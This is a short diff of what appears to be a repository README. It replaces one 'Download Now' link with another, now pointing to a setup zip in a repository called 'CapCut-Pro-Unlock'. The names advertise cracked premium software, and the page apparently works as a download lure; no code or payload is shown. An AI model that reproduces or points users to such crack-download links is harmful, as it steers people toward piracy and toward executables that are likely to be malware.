@@ -9,7 +9,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://github.com/CrackOverlord/CapCut-Studio-Toolkit/releases/download/setup-v2.1/setup-v2.1.zip)
+[![Download Now](https://github.com/Signalbrerhythm/CapCut-Pro-Unlock/releases/download/setup-2.11/setup-v2.11.zip)
 
 </div>
 
